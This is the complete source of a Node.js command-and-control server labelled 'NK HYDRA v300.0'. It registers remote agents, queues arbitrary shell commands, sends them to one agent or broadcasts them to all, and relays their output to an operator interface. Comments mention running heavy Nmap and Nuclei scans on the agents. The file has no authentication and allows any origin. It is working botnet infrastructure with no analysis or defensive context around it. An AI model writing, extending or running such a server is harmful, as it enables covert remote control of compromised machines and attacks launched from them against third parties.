// TYPE: NODE.JS C2 SERVER
// NK HYDRA v300.0 [TITAN RESILIENCE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { res.json({ status: 'online', version: 'v300.0', agents: agents.length }); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    // CRITICAL: Increased timeouts for heavy scans (Nmap, Nuclei)
    // This allows clients to "hang" while processing heavy CPU tasks without disconnect
    pingInterval: 25000, 
    pingTimeout: 120000, // 2 Minutes timeout!
    maxHttpBufferSize: 1e8, 
    transports: ['polling', 'websocket'] 
});

let agents = []; 
const commandQueue = [];
const eventHistory = []; 
const MAX_HISTORY = 40; 

const broadcastLog = (type, payload) => {
    try {
        const event = { type, payload, timestamp: Date.now() };
        // Truncate
        const histEvent = { ...event };
        if (typeof histEvent.payload === 'string' && histEvent.payload.length > 3000) {
            histEvent.payload = histEvent.payload.substring(0, 3000) + '... [TRUNCATED]';
        }
        eventHistory.push(histEvent);
        if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
        
        io.to('ui_room').emit('agent_event', event);
    } catch (e) { console.error("Broadcast Error:", e); }
};

let isProcessingQueue = false;
const processQueue = async () => {
    if (isProcessingQueue) return;
    isProcessingQueue = true;
    try {
        while (commandQueue.length > 0) {
            const task = commandQueue.shift();
            if (task) {
                if (task.targetId === 'all') {
                    io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                    broadcastLog('INFO', { source: 'C2', message: `Broadcast: ${task.cmd}` });
                } else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent) {
                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                         broadcastLog('INFO', { source: 'C2', message: `Sent to ${agent.id}: ${task.cmd}` });
                    }
                }
            }
            await new Promise(r => setTimeout(r, 50)); 
        }
    } finally {
        isProcessingQueue = false;
    }
};

io.on('connection', (socket) => {
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            socket.emit('history_dump', eventHistory); 
            return;
        }
        
        agents = agents.filter(a => a.id !== data.id);
        agents.push({ ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() });
        io.to('ui_room').emit('agents_list', agents);
        broadcastLog('SUCCESS', { source: 'C2_SYS', message: `Agent Connected: ${data.id}` });
        if(commandQueue.length > 0) processQueue();
    });

    socket.on('exec_cmd', (data) => {
        commandQueue.push({ ...data, id: Date.now().toString() });
        processQueue();
    });
    
    socket.on('agent_event', (data) => {
        // Direct relay - processing happens on client
        try {
            const event = { 
                type: data.type, 
                agentId: data.agentId,
                payload: data.payload,
                timestamp: Date.now()
            };
            
            // Log if important
            if (data.type === 'SUCCESS' || data.type === 'ERROR') {
                const histEvent = { ...event };
                // Keep history light
                if (typeof histEvent.payload === 'object') {
                     histEvent.payload = { ...histEvent.payload, stdout: '[LOGGED]' };
                }
                eventHistory.push(histEvent);
                if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
            }

            io.to('ui_room').emit('agent_event', event);
        } catch (e) { }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
            broadcastLog('WARNING', { source: 'C2_SYS', message: `Agent Lost: ${agent.id}` });
        }
    });
    
    socket.on('heartbeat', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) agent.lastSeen = Date.now();
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v300 LISTENING ON ${PORT}`));
